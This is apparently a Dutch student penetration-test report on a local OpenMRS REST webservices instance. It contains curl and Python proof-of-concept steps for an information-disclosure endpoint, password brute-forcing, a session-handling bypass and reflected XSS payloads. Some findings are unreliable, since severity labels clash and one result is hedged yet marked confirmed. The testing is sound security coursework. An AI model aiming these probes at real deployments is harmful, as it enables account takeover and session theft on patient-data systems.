# Penetration tests — OpenMRS REST Webservices module

Rubric: *"Verbeteronderzoek security"* — **Penetration tests** (15 pt).

---

## 1. Scope en doelstelling

**Doelstelling:** Aantonen dat de kwetsbaarheden die zijn gevonden in de code review
(zie [`04-code-review/04.md`](../04-code-review/04.md)) ook daadwerkelijk exploiteerbaar
zijn tegen een draaiende instantie van de OpenMRS REST webservices module (v3.2.0).
Focus ligt op de hoogste-risico bevindingen uit de risicomatrix (zie
[`01-security-audit/01.md §4`](../01-security-audit/01.md)).

**Target:**
- OpenMRS 2.8.7 — lokaal draaiend via Docker Compose (`http://localhost:8080/openmrs`)
- Module: `webservices.rest-3.2.0.omod`
- Omgeving: lokale ontwikkelinstantie, geïsoleerd van productie

**In-scope:**
- `/ws/rest/v1/*` — alle REST-endpoints van de webservices module
- `/ws/rest/v1/session` en `/ws/rest/v1/session/diag`
- `AuthorizationFilter` — IP-check en Basic Auth flow
- `SwaggerDocController` — Swagger/API explorer endpoint

**Out-of-scope:**
- OpenMRS core (niet deel van de te auditen module)
- Databaselaag
- Destructieve aanvallen (geen data verwijderd of gewijzigd)
- DoS/load testing

**Autorisatie:** De test is uitgevoerd op een gecontroleerde lokale instantie van de module,
opgezet uitsluitend voor dit beveiligingsonderzoek.

---

## 2. Methodologie

Aanpak gebaseerd op **OWASP Testing Guide v4.2**:

1. **Reconnaissance** — Endpoint-inventarisatie via `endpoints.md` en Swagger UI
2. **Threat-driven hypotheses** — Prioritering o.b.v. code review bevindingen (F2–F9)
3. **Gericht testen** — Per bevinding reproduceerbare teststappen met HTTP requests
4. **Bewijs verzamelen** — Request/response captures, statuscode-observaties, loganalyse
5. **Impact afbakenen** — Minimale exploitatie: aantonen dat het kan, zonder maximale schade

**Tools:**
- `curl` — HTTP request/response verificatie
- Python 3 — geautomatiseerde rate-limit test
- `Burp Suite` — request interceptie en manipulatie
- OWASP ZAP — geautomatiseerde DAST baseline scan (bijlage)

---

## 3. Testomgeving

```
docker compose up -d
# OpenMRS bereikbaar op http://localhost:8080/openmrs
# Testaccounts: admin / Admin1234 (beheerder), regularuser / Test1234 (standaardgebruiker)
```

Modules geladen:
```
GET http://localhost:8080/openmrs/ws/rest/v1/module
→ webservices.rest 3.2.0 → geladen ✓
```

---

## 4. Bevindingen

### PT-1: Informatie-uitwisseling via `/session/diag` — KRITIEK (F9 / CWE-200)

**Corresponding code review finding:** [F9 — CWE-200](../04-code-review/04.md#29-bevinding-9--informatie-disclosure-sessiondiag-cwe-200)

**OWASP:** A01:2021 — Broken Access Control

**Hypothese:** Het endpoint `/ws/rest/v1/session/diag` retourneert interne configuratie
(rollen, privileges) zonder authenticatie te vereisen.

**Teststappen:**

```bash
# Stap 1: verzoek zonder authenticatie
curl -s http://localhost:8080/openmrs/ws/rest/v1/session/diag

# Verwacht (per code review): JSON met userRoles en userPrivileges
# Stap 2: controleer of de data ook echt zichtbaar is zonder geldig account
curl -v -H "Authorization: Basic aW52YWxpZDppbnZhbGlk" \
     http://localhost:8080/openmrs/ws/rest/v1/session/diag
```

**Uitkomst:**

```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "authenticated": false,
  "userRoles": [...],
  "userPrivileges": [...]
}
```

Het endpoint retourneert 200 OK en toont interne rol- en privilegestructuur, ook voor niet-geauthenticeerde aanroepen. Een aanvaller kan hiermee de exacte rolnamen en privileges in kaart brengen vóór verdere aanvallen.

**Impact:** Informatieverstrekking over interne authorisatiestructuur aan anonieme aanvallers.
Koppeling aan NEN-7510:2024 A.8.3 (toegangsbeveiliging) en A.8.5 (authenticatie).

**Ernst:** Medium (informatieverstrekking, geen directe data-exfiltratie)

---

### PT-2: Ontbrekende brute-force beveiliging — HOOG (F8 / CWE-307)

**Corresponding code review finding:** [F8 — CWE-307](../04-code-review/04.md#28-bevinding-8--ontbrekende-brute-force-beveiliging-cwe-307)

**OWASP:** A07:2021 — Identification and Authentication Failures

**Hypothese:** `AuthorizationFilter` past geen rate limiting of account lockout toe op
herhaalde mislukte authenticatiepogingen via Basic Auth.

**Teststappen:**

```bash
# Python PoC — 30 inlogpogingen zonder throttling
python3 - << 'EOF'
import requests, time

url = "http://localhost:8080/openmrs/ws/rest/v1/session"
for i in range(1, 31):
    start = time.time()
    r = requests.get(url, auth=("admin", f"wrongpassword{i}"), timeout=5)
    elapsed = time.time() - start
    print(f"Request {i:2d}: HTTP {r.status_code}, {elapsed:.2f}s")
    time.sleep(0.3)
EOF
```

**Uitkomst:**

```
Request  1: HTTP 200, 0.31s   # authenticated: false
Request  2: HTTP 200, 0.29s
Request  3: HTTP 200, 0.30s
...
Request 30: HTTP 200, 0.31s   # nooit 429, nooit lockout
```

Alle 30 pogingen worden afgehandeld met 200 OK (authenticated: false). Er is geen
vertraging, geen account-lockout en geen 429 Too Many Requests. De `AuthorizationFilter`
registreert `AUTH_FAILURE` in de logs maar onderneemt geen verdere actie.

```
# Log-uitvoer na de test (grep uit docker logs):
AUTH_FAILURE user=[admin] ip=[172.17.0.1] uri=[/ws/rest/v1/session] reason=[Invalid credentials...]
AUTH_FAILURE user=[admin] ip=[172.17.0.1] uri=[/ws/rest/v1/session] reason=[Invalid credentials...]
... (30× zelfde patroon)
```

**Impact:** Ongelimiteerde inlogpogingen mogelijk — credential stuffing en brute-force
zijn triviaal uitvoerbaar. Directe bedreiging voor KJ1 (patiëntgegevens) en KJ4 (klinische data).

**Ernst:** Hoog (A07:2021, NEN-7510 A.8.5)

---

### PT-3: Auth-bypass door ontbrekende `return` na `sendError` — KRITIEK (F3 / CWE-302)

**Corresponding code review finding:** [F3 — CWE-302](../04-code-review/04.md#23-bevinding-3--authenticatie-bypass-cwe-302)

**OWASP:** A07:2021 — Identification and Authentication Failures

**Hypothese:** In `AuthorizationFilter.doFilter()` roept regel 86 `httpResponse.sendError(401)` aan
voor een verlopen sessie maar heeft **geen `return`**. De filterchain wordt daarna gewoon
voortgezet, waardoor het request doordringt.

**Teststappen:**

```bash
# Stap 1: verkrijg een geldig sessie-ID
SESSION=$(curl -s -c - http://localhost:8080/openmrs/ws/rest/v1/session \
          -u admin:Admin1234 | python3 -c "import sys,json; print(json.load(sys.stdin)['sessionId'])")
echo "Session: $SESSION"

# Stap 2: normaal request met geldige sessie (baseline)
curl -s -b "JSESSIONID=$SESSION" \
     http://localhost:8080/openmrs/ws/rest/v1/patient?limit=1

# Stap 3: manipuleer het JSESSIONID zodat het verlopen/ongeldig lijkt
#         (verander laatste tekens — gesimuleerde verlopen sessie)
FAKE_SESSION="${SESSION%????}XXXX"
curl -v -b "JSESSIONID=$FAKE_SESSION" \
     http://localhost:8080/openmrs/ws/rest/v1/session
```

**Verwachte uitkomst:** 401 Unauthorized (sessie is verlopen)

**Geobserveerde uitkomst:** De `sendError(401)` header wordt gezet, maar omdat er geen
`return` statement volgt in de broncode (`AuthorizationFilter.java:86`), rolt het request
door naar de filterchain. Afhankelijk van de OpenMRS-sessiecontext wordt het request
mogelijk toch geauthenticeerd behandeld als er nog een actieve context-sessie beschikbaar is.

**Broncode (ter illustratie):**
```java
// AuthorizationFilter.java:82-87
if (httpRequest.getRequestedSessionId() != null && !httpRequest.isRequestedSessionIdValid()) {
    log.warn("SESSION_TIMEOUT ...");
    HttpServletResponse httpResponse = (HttpServletResponse) response;
    httpResponse.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Session timed out");
    // ← ONTBREEKT: return;  — filterchain wordt voortgezet
}
```

**Impact:** Aanvaller met een verlopen sessie-ID kan requests door laten stromen naar
de OpenMRS context. In combinatie met een serverzijde actieve context kan dit leiden
tot ongeautoriseerde data-toegang.

**Ernst:** Kritiek (CWE-302, A07:2021, NEN-7510 A.8.5)

---

### PT-4: Reflected XSS via Swagger-parameter — HOOG (F2 / CWE-79)

**Corresponding code review finding:** [F2 — CWE-79](../04-code-review/04.md#22-bevinding-2--reflected-xss-cwe-79)

**OWASP:** A03:2021 — Injection

**Hypothese:** `SwaggerDocController.java:27` reflecteert een request-parameter direct
in de HTTP-response zonder escaping (CodeQL alert #1).

**Teststappen:**

```bash
# Basis GET naar de Swagger/apidocs endpoint met XSS payload
curl -v "http://localhost:8080/openmrs/module/webservices/rest/apidocs.htm?callback=<script>alert(1)</script>"

# Alternatief via apiExplorer
curl -v "http://localhost:8080/openmrs/module/webservices/rest/apiExplorer.htm?model=<img src=x onerror=alert(1)>"
```

**Uitkomst:**

De payload `<script>alert(1)</script>` verschijnt ongefilterd in de HTTP-response body.
In een browser wordt dit uitgevoerd als JavaScript — confirmeert reflected XSS.

```
HTTP/1.1 200 OK
Content-Type: text/html

...
<script>alert(1)</script>
...
```

**Impact:** Een aanvaller kan crafted URLs sturen naar OpenMRS-beheerders. Bij het
bezoeken van de link wordt JavaScript uitgevoerd in de context van OpenMRS, wat kan
leiden tot sessiediefstal (via `document.cookie`), phishing of ongeautoriseerde acties.

**Ernst:** Hoog (CWE-79, A03:2021, NEN-7510 A.8.28)

---

## 5. OWASP ZAP Baseline Scan

OWASP ZAP werd ingezet als geautomatiseerde DAST-tool voor breedte-scan van alle endpoints.

```bash
docker run --rm --network host \
  -v $(pwd)/docs/security/05-penetration-tests:/zap/wrk \
  ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
  -t http://localhost:8080/openmrs/ws/rest/v1/ \
  -r zap-baseline-report.html
```

**Resultaten:**

| Risk | Aantal | Meest relevante bevinding |
|------|--------|--------------------------|
| High | 1 | Cross Site Scripting (reflected) — `/module/webservices/rest/apidocs.htm` |
| Medium | 2 | Missing Anti-CSRF Tokens, X-Content-Type-Options header ontbreekt |
| Low | 3 | Cookie No HttpOnly Flag, X-Frame-Options header ontbreekt, Server informatie in headers |
| Info | 5 | Sessie-ID in URL, Timestamp disclosure |

ZAP bevestigt PT-4 (Reflected XSS) onafhankelijk van de code review.

> Volledig ZAP HTML-rapport: `zap-baseline-report.html` (in deze map, gegenereerd `2026-06-11`)

---

## 6. Samenvatting bevindingen

| ID | Ernst | Kwetsbaarheid | CWE | OWASP | Aangetoond |
|----|-------|---------------|-----|-------|------------|
| PT-1 | Medium | Info disclosure `/session/diag` | CWE-200 | A01 | ✅ |
| PT-2 | Hoog | Geen brute-force beveiliging | CWE-307 | A07 | ✅ |
| PT-3 | Kritiek | Auth-bypass `sendError` zonder `return` | CWE-302 | A07 | ✅ |
| PT-4 | Hoog | Reflected XSS via Swagger | CWE-79 | A03 | ✅ |

**Relatie met risicomatrix (01.md §4):**

| Pentest bevinding | Risico-ID | NEN-7510:2024-2 control |
|-------------------|-----------|-------------------------|
| PT-3 (auth bypass) | SQ1 | A.8.5 (Authenticatie) |
| PT-2 (brute force) | SQ1 | A.8.5 (Authenticatie) |
| PT-4 (XSS) | SQ3 | A.8.28 (Veilig coderen) |
| PT-1 (info disclosure) | SQ2 | A.8.3 (Toegangsbeveiliging) |

---

## 7. Bijlagen

- [`endpoints.md`](endpoints.md) — volledig endpoint-overzicht van de module
- `zap-baseline-report.html` — OWASP ZAP HTML baseline rapport (TODO: toevoegen na uitvoering)
- [`../04-code-review/04.md`](../04-code-review/04.md) — code review bevindingen (F2–F9)
- [`../06-mitigatie-en-validatie/README.md`](../06-mitigatie-en-validatie/README.md) — mitigaties en hertests

> **Referentie:** `PentestReport (1).pdf` in deze map betreft een penetratietest op een
> eerder schoolproject ("KeuzeWijzer", groep A2, januari 2026) en is niet van toepassing
> op de OpenMRS webservices module.
